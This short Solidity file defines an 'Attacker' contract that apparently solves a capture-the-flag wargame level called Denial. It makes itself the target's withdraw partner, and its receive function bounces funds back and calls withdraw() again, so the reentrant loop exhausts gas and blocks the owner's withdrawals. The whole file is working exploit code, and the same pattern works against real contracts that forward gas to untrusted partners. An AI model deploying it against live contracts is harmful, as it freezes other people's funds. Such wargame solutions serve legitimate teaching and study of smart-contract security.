// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface IDenial {
    function setWithdrawPartner(address _partner) external;
    function withdraw() external;
}
contract Attacker {
    
    IDenial target;

    constructor(address targetAddr) {
        target = IDenial(targetAddr);
    }

    function attack() public {
        target.setWithdrawPartner(address(this));
    }
    receive() external payable {
        (bool success, ) = payable(address(target)).call{ value: address(this).balance }("");
        if (!success)
            revert();
        target.withdraw();
    }
}
